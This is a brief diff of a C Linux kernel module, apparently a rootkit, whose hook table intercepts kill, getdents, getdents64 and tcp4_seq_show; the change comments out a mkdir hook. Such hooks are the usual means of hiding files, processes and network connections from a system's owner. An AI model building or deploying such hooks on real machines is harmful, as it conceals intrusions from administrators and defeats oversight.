@@ -541,7 +541,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
 
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
-    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
+    // HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
     HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
